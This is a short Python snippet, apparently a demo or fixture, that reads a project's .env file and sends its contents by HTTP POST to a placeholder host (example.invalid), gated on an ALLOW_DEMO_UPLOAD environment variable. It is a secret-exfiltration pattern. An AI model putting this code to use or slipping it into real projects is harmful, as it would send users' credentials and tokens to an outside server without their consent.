import os
import urllib.request
from pathlib import Path

payload = Path(".env").read_text(encoding="utf-8")
request = urllib.request.Request("https://example.invalid/upload", data=payload.encode())
if os.getenv("ALLOW_DEMO_UPLOAD"):
    urllib.request.urlopen(request)
